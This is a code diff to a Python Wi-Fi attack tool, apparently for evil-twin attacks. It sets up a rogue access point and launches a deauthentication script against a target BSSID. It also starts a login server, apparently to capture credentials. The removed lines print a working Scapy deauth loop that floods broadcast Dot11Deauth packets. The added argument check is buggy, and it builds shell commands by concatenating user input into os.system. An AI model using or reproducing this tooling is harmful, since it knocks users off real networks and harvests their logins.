@@ -1,9 +1,4 @@
-
 import os
-import logging
-import time
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import *
 
 
 class netspoof():
@@ -11,7 +6,7 @@ class netspoof():
     def __init__(self):
         self.req_var = True
         self.opt_var = False
-        self.req_variables = ["-i", "-s", "-c"]
+        self.req_variables = ["-s", "-a", "-c", "-d", "-b"]
 
     def help(self):
         hlp = (
@@ -23,16 +18,18 @@ class netspoof():
             "use the control + c\n"
             "\nUsage:\n"
             "############\n"
-            "\n'netspoof -s <ssid> -i <interface> -c <channel>'\n"
+            "\n'netspoof -s <ssid> -a <ap_interface> -c <channel> -d <deauth_interface> -b <bssid to deaauth>'\n"
         )
         return hlp
 
     def netspoof(self, var):
-        if "-s" in var and "-i" in var and "-c" in var:
+        if "-s" and "-a" and "-c" and "-d" and "-b" in var:
             try:
-                #self.start_server()
-                #self.deauthnet(var["-i"], var["-s"])
-                self.createAP(var["-s"], var["-i"], var["-c"])
+                # starting deauth attack and login server  
+                os.system("sudo gnome-terminal -x sh -c 'sudo python login_server.py'")
+                cmd = 'sudo python deauth.py ' + var["-d"] + ' ' + var["-b"]
+                os.system("sudo gnome-terminal -x sh -c" + " '" + cmd + "'")
+                self.createAP(var["-s"], var["-a"], var["-c"])
 
             except Exception:
                 error = []
@@ -91,31 +88,6 @@ class netspoof():
             os.system("sudo service hostapd stop")
             self.closenetspoof()
 
-
-
-    def deauthnet(self, iface, bssid):
-        run = True
-        # make sure device is in monitor mode
-        os.system("sudo ifconfig " + iface + " down")
-        os.system("sudo iwconfig " + iface + " mode monitor")
-        os.system("sudo ifconfig " + iface + " up")
-
-        # creating deauth packet to send
-        packet = (
-            RadioTap() /
-            Dot11(
-                type=0, addr1="ff:ff:ff:ff:ff:ff",
-                addr2=bssid,
-                addr3=bssid) / Dot11Deauth()
-        )
-        print("Sending Deautherization Packets")
-        print("Use control+c to stop")
-        while run:
-            try:
-                sendp(packet, iface=iface, verbose=False)
-            except KeyboardInterrupt:
-                run = False
-                print("Deautherization has stopped")
 
     def closenetspoof(self):
         print("hello")
